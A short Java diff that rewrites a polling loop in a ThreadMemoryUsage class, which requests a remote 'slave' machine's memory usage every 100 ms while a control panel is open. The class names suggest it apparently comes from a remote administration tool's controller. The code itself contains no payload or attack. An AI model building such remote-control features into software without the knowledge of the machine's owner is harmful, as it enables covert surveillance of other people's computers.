@@ -15,14 +15,25 @@ public class ThreadMemoryUsage extends Thread {
 	}
 
 	public void run() {
-		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
-		PanelMemoryUsage panel = (PanelMemoryUsage) frame.panels.get("memory usage");
-		while (frame != null && panel != null && panel.shouldSend() && panel.slave.getIP().equals(slave.getIP())) {
-			slave.addToSendQueue(new Packet33UsedMemory());
-			try {
-				Thread.sleep(100L);
-			} catch (Exception e) {
-				e.printStackTrace();
+		while (true) {
+			FrameControlPanel frame = FrameControlPanel.instances.get(slave);
+			
+			if (frame != null) {
+				PanelMemoryUsage panel = (PanelMemoryUsage) frame.panels.get("memory usage");
+
+				if (panel.shouldSend()) {
+					slave.addToSendQueue(new Packet33UsedMemory());
+				} else {
+					break;
+				}
+				
+				try {
+					Thread.sleep(100L);
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+			} else {
+				break;
 			}
 		}
 	}
